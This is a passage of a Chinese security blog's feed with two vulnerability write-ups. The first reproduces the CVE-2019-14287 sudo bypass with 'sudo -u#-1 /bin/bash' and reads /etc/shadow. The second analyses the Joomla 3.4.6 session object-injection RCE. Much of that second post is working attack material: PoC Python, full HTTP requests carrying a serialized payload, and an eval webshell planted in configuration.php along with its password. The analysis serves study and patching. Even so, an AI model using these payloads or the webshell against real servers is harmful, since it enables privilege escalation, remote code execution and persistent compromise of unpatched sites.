    <content type="html"><![CDATA[<h4 id="【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过"><a href="#【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过" class="headerlink" title="【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过"></a>【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过</h4><p><img src="/2019/10/15/【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/2019-10-15-23-59-13.png" alt></p><h4 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h4><p>2019年10月14日，Sudo官方释放了新版本1.8.28，其中包含sudo root权限绕过漏洞的补丁修复。<br>此漏洞编号是CVE-2019-14287，用户可以构造的payload,在特定条件下可以可以通过指定用户ID -1或4294967295以root用户身份运行命令。</p><h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table><thead><tr><th>漏洞名称</th><th>sudo 权限绕过漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>CVE-2019-14287</td></tr><tr><td>CNVD编号</td><td>-</td></tr><tr><td>影响版本</td><td>sudo &lt;1.8.28</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间</td><td>2019年10月14日</td></tr></tbody></table><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>sudo &lt; 1.8.28</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>官网描述的漏洞细节（<a href="https://www.sudo.ws/alerts/minus_1_uid.html）" target="_blank" rel="noopener">https://www.sudo.ws/alerts/minus_1_uid.html）</a><br><img src="/2019/10/15/【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/2019-10-15-19-59-16.png" alt><br>从中截取部分如下：<br>当 /etc/sudoers 文件存在如下形式的配置时，bob实际上可以通过运行sudo -u＃-1 vi来越权以root身份运行vi程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myhsot bob=(ALL, !root) /usr/bin/vi</span><br></pre></td></tr></table></figure><p>先解释下这段配置<br>myhsot -– 在myhost主机上，一般配置为ALL即在所有主机<br>bob –- 表示将bob用户加入sudo组，如果给组赋权在前面加上%<br>(ALL, !root) –-以root身份以外的任何用户身份<br>/usr/bin/vi –- 允许执行的程序或命令，这里是只允许执行vi<br>（详细介绍请参考官网手册<a href="https://www.sudo.ws/sudo/man/1.8.2/sudoers.man.html）" target="_blank" rel="noopener">https://www.sudo.ws/sudo/man/1.8.2/sudoers.man.html）</a></p><p><strong>一句总结起来的就是：在/etc/sudoers配置中只允许用户bob以root身份以外的任何用户身份在myhost主机上运行vi。但是由于sudo存在漏洞，bob实际上可以通过运行sudo -u＃-1 vi来以root身份运行 vi程序。</strong></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-查看sudo版本"><a href="#1-查看sudo版本" class="headerlink" title="1.查看sudo版本"></a>1.查看sudo版本</h5><p>在Linux终端中使用sudo -V 命令查看版本<br><img src="/2019/10/15/【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/2019-10-15-17-25-52.png" alt><br>该版本号为1.8.19p1,在影响范围中</p><p>使用普通用户lab(uid=1000)直接查看/etc/shadow提示权限拒绝<br><img src="/2019/10/15/【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/2019-10-15-17-32-51.png" alt></p><h5 id="2-修改-etc-sudoers-文件"><a href="#2-修改-etc-sudoers-文件" class="headerlink" title="2.修改/etc/sudoers 文件"></a>2.修改/etc/sudoers 文件</h5><p>修改/etc/sudoers 文件<br>加入以下内容：</p><figure class="highlight plain"><figcaption><span>ALL</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">**允许lab用户在所有主机上以root身份以外的任何用户身份执行bin/bash程序**</span><br><span class="line"></span><br><span class="line">![]( 【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/2019-10-15-17-31-19.png )</span><br><span class="line"></span><br><span class="line">*这一步配置主要是测试使用，实际运维工作中很少见</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 3.漏洞利用权限绕过</span><br><span class="line">1.进入lab的终端执行</span><br><span class="line">```sudo -u#-1 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/2019/10/15/【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/2019-10-15-19-52-24.png" alt><br>对比发现uid=0(root)，gid和group均未发生变化<br>查看/etc/shadows文件<br><img src="/2019/10/15/【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/2019-10-15-19-56-44.png" alt><br>到这里就进行了绕过</p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>升级sudo到1.8.28版本<br>官网：<a href="https://www.sudo.ws" target="_blank" rel="noopener">https://www.sudo.ws</a></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>[1].<a href="https://www.sudo.ws/alerts/minus_1_uid.html" target="_blank" rel="noopener">https://www.sudo.ws/alerts/minus_1_uid.html</a><br>[2].<a href="https://www.sudo.ws/sudo/man/1.8.2/sudoers.man.html" target="_blank" rel="noopener">https://www.sudo.ws/sudo/man/1.8.2/sudoers.man.html</a></p><h4 id="免责声明："><a href="#免责声明：" class="headerlink" title="免责声明："></a>免责声明：</h4><p>本文中提到的测试利用代码、Poc和脚本工具仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过&quot;&gt;&lt;a href=&quot;#【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过&quot; class=&quot;headerlink&quot; title=&quot;【漏洞复现】CVE-20
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【漏洞分析】Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造</title>
    <link href="www.ja0k.com/2019/10/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91Joomla-3-4-6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8CPoc%E6%9E%84%E9%80%A0/"/>
    <id>www.ja0k.com/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/</id>
    <published>2019-10-09T12:24:17.000Z</published>
    <updated>2019-10-31T08:18:49.457Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/fd87976bb0347e8a60d5929c0cd96b58.jpg" alt></p><p>Author：Ja0k</p><h3 id="事件背景"><a href="#事件背景" class="headerlink" title="#事件背景"></a>#事件背景</h3><p>上周，意大利安全公司 Hacktive Security的研究员 Alessandro<br>Groppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-8562。建议使用就版本的用户更新到安全版本。</p><p>在此次漏洞复现和原理分析过程中，学到很多东西，在这里要感谢PHITHON关于Joomla远程代码执行漏洞的总结，让我少走了很多弯路。<br>另外本文较长，请耐心阅读！</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="#影响范围"></a>#影响范围</h3><p>Joomla 3.0.0 至 3.4.6</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="#漏洞复现"></a>#漏洞复现</h3><p>1.安装部署</p><p>下载： <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></p><p>浏览器访问 <a href="http://127.0.0.1/Joomla/3.4.6/installation/index.php" target="_blank" rel="noopener">http://127.0.0.1/Joomla/3.4.6/installation/index.php</a> 安装<br>注意：第3步最终确认哪里，应该选择 “不安装示范数据”，目前测试的是选择”博客风格的示范内容”不能成功复现<br>安装成功<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2d4bdfef5893c614625d22200e420a74.png" alt></p><p><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/46fd8c6f736390b380364e6d307727ca.png" alt></p><p>2.Poc复现<br>Poc地址:<br><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py</a></p><p>脚本利用</p><p><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/0aa0ffdb124bb25fa6993dccb7b203c3.png" alt></p><p>执行成功反弹shell并在“configuration.php”写入随机密码的一句话木马</p><p><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/cccd2fb43f5e1de2656dafd06cbdc8e2.png" alt></p><p>可以用NC 监听和 菜刀连接 由于我的PHP是Windows环境所以无法反弹只能通过菜刀连接</p><p>caidao密码为 scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay 菜刀连接成功</p><p><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/deb907880fabab9ca9176b5a50d1d877.png" alt></p><h3 id="Exp攻击链分析"><a href="#Exp攻击链分析" class="headerlink" title="#Exp攻击链分析"></a>#Exp攻击链分析</h3><p>目前互联网上公开的Exp下载地址:<br><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py</a><br>通过漏洞复现和分析py脚本可以知道，在上传shell的时候有以下几步，之所以有这么手工步骤主要与Joomla的会话机制有关。<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-02-03.png" alt></p><p><strong>1.获取Cookie</strong><br>代码:<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-03-02.png" alt><br>通过burpeuite抓到的请求包1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><strong>2.获取csrf-token （关键步骤）</strong><br>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def get_token(url, cook):</span><br><span class="line">        token = &apos;&apos;</span><br><span class="line">        resp = requests.get(url, cookies=cook, proxies = PROXS)</span><br><span class="line">        html = BeautifulSoup(resp.text,&apos;html.parser&apos;)</span><br><span class="line">        # csrf token is the last input</span><br><span class="line">        for v in html.find_all(&apos;input&apos;):</span><br><span class="line">                csrf = v</span><br><span class="line">        csrf = csrf.get(&apos;name&apos;)</span><br><span class="line">        return csrf</span><br></pre></td></tr></table></figure><p>通过burpeuite抓到的请求包2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: dc674b0eef3d2412c63832504cf5ac18=sfoodgd4m6fj2c1895u5b2tmp6;</span><br></pre></td></tr></table></figure><p>主要是从返回包中提取 csrftoken<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-17-13-45.png" alt></p><p>3.生成payload 这里有2个payload<br><strong>后门的payload</strong><br>代码:<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-06-44.png" alt><br>利用PHP自带的file_put_contents函数写入webshell到configuration.php中，webshell内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;if(isset($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;])) eval($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;]);&apos;</span><br></pre></td></tr></table></figure><p><strong>反弹的payload</strong><br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-09-23.png" alt><br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-07-33.png" alt></p><p>4.发送带有写入webshell的请求<br>主要构造username,password,option,task,csrftoken等字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def make_req(url , object_payload):</span><br><span class="line">        # just make a req with object</span><br><span class="line">        print_info(&apos;Getting Session Cookie ..&apos;)</span><br><span class="line">        cook = get_cook(url)</span><br><span class="line">        print_info(&apos;Getting CSRF Token ..&apos;)</span><br><span class="line">        csrf = get_token( url, cook)</span><br><span class="line"> </span><br><span class="line">        user_payload = &apos;\\0\\0\\0&apos; * 9</span><br><span class="line">        padding = &apos;AAA&apos; # It will land at this padding</span><br><span class="line">        working_test_obj = &apos;s:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;&#125;&apos;</span><br><span class="line">        clean_object = &apos;A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB&apos; # working good without bad effects</span><br><span class="line"> </span><br><span class="line">        inj_object = &apos;&quot;;&apos;</span><br><span class="line">        inj_object += object_payload</span><br><span class="line">        inj_object += &apos;s:6:&quot;return&quot;;s:102:&apos; # end the object with the &apos;return&apos; part</span><br><span class="line">        password_payload = padding + inj_object</span><br><span class="line">        params = &#123;</span><br><span class="line">            &apos;username&apos;: user_payload,</span><br><span class="line">            &apos;password&apos;: password_payload,</span><br><span class="line">            &apos;option&apos;:&apos;com_users&apos;,</span><br><span class="line">            &apos;task&apos;:&apos;user.login&apos;,</span><br><span class="line">            csrf :&apos;1&apos;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        print_info(&apos;Sending request ..&apos;)</span><br><span class="line">        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)</span><br><span class="line">        return resp.text</span><br></pre></td></tr></table></figure><p>下面是通过Burpsuite抓包获取的写入webshell的请求包3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: dc674b0eef3d2412c63832504cf5ac18=bg7tprkie898gu5luh1it52ga3</span><br><span class="line">Content-Length: 1136</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&amp;password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A217%3A%22file_put_contents%28%27configuration.php%27%2C%27if%28isset%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%29+eval%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%3B%27%2C+FILE_APPEND%29+%7C%7C+%24a%3D%27http%3A%2F%2Fwtf%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&amp;option=com_users&amp;task=user.login&amp;03b291424900343c59f58ad131d087a7=1</span><br></pre></td></tr></table></figure><p>5.连接webshell测试是否写入成功<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-05-03.png" alt><br>通过burpeuite抓到的请求包4：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /Joomla/3.4.6//configuration.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 70</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay=echo+%27PWNED%27%3B</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="#漏洞分析"></a>#漏洞分析</h3><p>这个漏洞是和Joomla的会话的运作机制有关，Joomla 会话以 PHP Objects 的形式存储在数据库中且由 PHP 会话函数处理，但是由于Mysql无法保存Null 字节，函数在将session写入数据库和读取时会对象因大小不正确而导致不合法从而溢出。因为未认证用户的会话也可存储，所以该对象注入 (Object Injection) 可以在未登录认证的情况下攻击成功，导致RCE。</p><p><strong>1.溢出</strong><br>当我们在 Joomla中执行 POST 请求时，通常会有303重定向将我们重定向至结果页。这是利用的重要事项，因为第一个请求（含参数）将只会导致 Joomla 执行动作并存储（例如调用write() 函数）会话，之后303重定向将进行检索（如调用read() 函数）并将信息显示给用户。</p><p>漏洞利用文件<br>‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。<br>由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘\0\0\0’替换‘\x00\x2a\x00’(chr(0).’<em>’.chr(0))，而在序列化对象中， $protected 变量被赋予‘\x00\x2a\x00’前缀。<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-17-35-50.png" alt><br>当读取数据库中的数据时， read 函数会用‘\x00\x2a\x00’（N</em>N）替换‘\0\0\0’，重构原始对象。<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-22-27-37.png" alt><br>这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。<br>如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘\0\0\0’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。<br><strong>举个栗子</strong><br>比如一个登录表单，在 username 字段中放入‘my\x00\x2a\x00username’，经过write函数处理后将在数据库中得到如下对象:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:16:&quot;my\0\0\0username&quot;</span><br></pre></td></tr></table></figure><p>当该会话对象被 read 函数中读取时，‘\0\0\0’将被以如上所述方式所替代，得到如下值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:16:&quot;myN*Nusername&quot; --&gt;不合法的大小</span><br></pre></td></tr></table></figure><p>被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！<br>就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。<br>在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。</p><p><strong>2. 对象注入（反序列化）</strong>  (本部分参考PHITHON的博客)<br>CVE-2015-8562的Poc如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;4</span><br></pre></td></tr></table></figure><p>在这个执行链中，分别利用了如下类：<br>JDatabaseDriverMysqli<br>SimplePie</p><p><strong>2.1 JDatabaseDriverMysqli类</strong><br>我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;disconnect();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    public function disconnect()</span><br><span class="line">    &#123;</span><br><span class="line">        // Close the connection.</span><br><span class="line">        if ($this-&gt;connection)</span><br><span class="line">        &#123;</span><br><span class="line">            foreach ($this-&gt;disconnectHandlers as $h)</span><br><span class="line">            &#123;</span><br><span class="line">                call_user_func_array($h, array( &amp;$this));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            mysqli_close($this-&gt;connection);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;connection = null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用<strong>destruct，</strong>destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。</p><p>但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。</p><p>于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), ‘init’]，传入call_user_func_array。</p><p>跟进init方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function init()</span><br><span class="line">    &#123;</span><br><span class="line">        // Check absolute bare minimum requirements.</span><br><span class="line">        if ((function_exists(&apos;version_compare&apos;) &amp;&amp; version_compare(PHP_VERSION, &apos;4.3.0&apos;, &apos;&lt;&apos;)) || !extension_loaded(&apos;xml&apos;) || !extension_loaded(&apos;pcre&apos;))</span><br><span class="line">        &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;data = array();</span><br><span class="line">            $this-&gt;multifeed_objects = array();</span><br><span class="line">            $cache = false;</span><br><span class="line"></span><br><span class="line">            if ($this-&gt;feed_url !== null)</span><br><span class="line">            &#123;</span><br><span class="line">                $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url);</span><br><span class="line">                // Decide whether to enable caching</span><br><span class="line">                if ($this-&gt;cache &amp;&amp; $parsed_feed_url[&apos;scheme&apos;] !== &apos;&apos;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $cache = call_user_func(array($this-&gt;cache_class, &apos;create&apos;), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), &apos;spc&apos;);</span><br></pre></td></tr></table></figure><p>很明显，其中这两个call_user_func将是触发代码执行的元凶。</p><p>所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。</p><p><strong>2.2 SimplePie类</strong><br>默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：<br><img src="/2019/10/09/【漏洞分析】Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-23-26-30.png" alt><br>而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。<br>P牛的Poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 